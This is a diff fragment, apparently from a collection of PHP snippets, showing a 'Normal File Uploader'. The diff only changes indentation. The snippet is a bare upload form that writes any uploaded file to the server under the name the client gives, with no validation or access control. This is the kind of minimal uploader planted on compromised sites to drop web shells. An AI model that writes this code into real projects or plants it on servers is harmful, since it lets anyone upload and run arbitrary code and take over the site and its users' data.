@@ -3,15 +3,15 @@
 1. Normal File Uploader
 
 
-	<?php 
-		echo 'Uploader<br>';
+    <?php 
+        echo 'Uploader<br>';
         echo '<form action="" method="post" enctype="multipart/form-data">';
         echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" value="Upload"></form>';
         if( $_POST['_upl'] == "Upload" ) {
-        	if(copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
-            	echo '<b>Success</b><br><br>';
+            if(copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
+                echo '<b>Success</b><br><br>';
             }else {
-            	echo '<b>Failed</b><br><br>'; 
+                echo '<b>Failed</b><br><br>'; 
             }
         }
     ?>
